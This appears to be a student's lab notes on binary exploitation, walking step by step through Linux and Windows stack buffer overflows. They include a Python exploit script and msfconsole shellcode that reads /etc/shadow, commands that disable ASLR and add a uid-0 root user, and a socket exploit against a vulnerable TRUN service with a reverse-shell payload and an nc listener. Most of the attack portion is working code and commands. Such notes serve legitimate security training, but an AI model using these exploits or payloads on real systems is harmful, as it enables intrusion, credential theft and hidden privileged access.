--Static Analysis
file <binaryname>
strings -n 10 <binaryname>

--$ strings -n 10 func | less
Potential Artifacts:  #log any suscpicous items
_IO_stdin_used
     Enter a string:   <-- raise sus
/home/student/func.c
getuserinput
     gets@@GLIBC_2.0   <-- raise sus
crtstuff.c
     puts@@GLIBC_2.0   <-- raise sus
     
--$ strings -n 5 func | less
func.c
stddef.h
types.h
libio.h
stdio.h
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
#research the potential artifacts

--Behavioral Analysis
run the exe
result:
Enter a string:

--Dynamic Analysis
#use ghidra

#gdb
--$ gdb <binaryname>
gdb-peda$ 

## comment out the source line
vim ~/.gdbinit

#find function
gdb-peda$ disass main
gdb-peda$ pdisass main
-disregard  <__x86.get_pc_thunk.ax>
function:
getuserinput     #custom created function

#look inside the function
gdb-peda$ disass getuserinput
gdb-peda$ pdisass getuserinput
-disregard <__x86.get_pc_thunk.bx>
call   0x3e0 <puts@plt>
call   0x3d0 <gets@plt>

peda plugin = highlighted red, vulnerable function
** This is what peda thinks is vulnerable


##Buffer Overflow
0. Run the program
./<exe>

1. Attempt to buffer overflow the program
https://wiremask.eu/tools/buffer-overflow-pattern-generator/
ex
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
results: Segmentation fault (core dumped)

2. Determine Buffer Overflow Offset
dmesg | tail -n 5
last line in result:
[4109352.932289] func[6730]: segfault at 31634130 ip 0000000031634130 sp 00000000ffffd4d0 error 14 in func[56555000+1000]
  31634130  # plug this into the website above
  62 characters minimum to Buffer overflow

3. validate the offset & craft exploit
   ###crafted exploit###
   ###linux_buffer.py###
   #!/usr/bin/python

   #buffer
   Buffer = "A" * 62

   #eip (placeholder)
   eip = "B" * 4

   #nop
   nop = "\x90" * 10

   #shellcode
   print(Buffer + eip + nop)
   ###crafted exploit###
   ###linux_buffer.py###

--$ gdb func
gdb-peda$ run <<< $(python linux_buffer.py)

4. generate Shellcode
--$ msfconsole
msf6 > use payload/linux/x86/exec
msf6 payload(linux/x86/exec) > show options
msf6 payload(linux/x86/exec) > set CMD cat /etc/shadow
msf6 payload(linux/x86/exec) > generate -b "\x00\x20\x0a\x0d" -f python
#copy and paste all of the buf = b"" into the linux_buffer script under #Shellcode
#add the buf variable to the print statement

5. Acquire JMP ESP from target machine
#Turn off ASLR  ##Its already turned off on the test
sudo sysctl -w kernel.randomize_va_space=0

--$ env - gdb func
(gdb) show env
LINES=27
COLUMNS=187
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) show env
(gdb) run
#Spam a lot of characters when prompted "Enter a string:"
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info proc map
(gdb) find /b 0xf7de2000,0xffffe000,0xff,0xe4
  #find <startaddr>,<endaddr>,0xff,0xe4
  #fist hex after the heap
  #last hex (before the stack)
  #0xff 0xe4 = JMP ESP
#take first six and go to script
#alter the eip variable using little indian of one of the hex values taken
#0xf7f65aff
#f7 f6 5a ff
#ff 5a f6 f7
eip = "\xff\x5a\xf6\xf7"
--$ sudo ./func <<< $(python linux_buffer_copy.py)

Create a root user
sudo useradd -ou 0 -g 0 matt
sudo passwd password


======================================================================================================================


##--Windows Buffer Overflow

### win_buffer.py ###
#!/usr/bin/python
#!/usr/bin/python

import socket

buf = "TRUN /.:/"
buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B"

s = socket.socket (socket.AF_INET,socket.SOCK_STREAM) #Creates IPv4 Socket/TCP protocol
s.connect(("10.50.35.122",9999)) #target ip address and port
print s.recv(1024) #print response
s.send(buf) #send the value of buf
print s.recv(1024) #Print response
s.close() #close the socket

### win_buffer.py ###

--$ python win_buffer.py

# play with the buf += till the program is in a stand still
# copy and paste the eip from immunitry debugger to get the offset value
offset = 2003

#alter script
#comment out buf += with the patter
buf += "A" * 2003

#type into the bottom bar of immunity debugger
!mona modules
--Log Data window

!mona jmp -r esp -m "essfunc.dll"
--Log Data window
625012A0 #first address

#split to little indian
625012A0
62 50 12 A0
A0 12 50 62
\xA0\x12\x50\x62

#alter script
buf += "\xA0\x12\x50\x62"
buf "\x90" * 10

--$ msfconsole
msf6 > use windows/shell_reverse_tcp
msf6 payload(windows/shell_reverse_tcp) > show options
msf6 payload(windows/shell_reverse_tcp) > set LHOST 10.50.23.87 #lin-ops
#could change lport but don't need too
msf6 payload(windows/shell_reverse_tcp) > generate -b "\x00\x20\x0a\x0d" -f python
#add all the buf += to the script

#close immunity debugger
#run the .exe as administrator

student@lin-ops:~$ nc -lvp 4444
#set up listener with the port from msfconsole

#run script
student@lin-ops:~$ python win_buffer_copy.py 







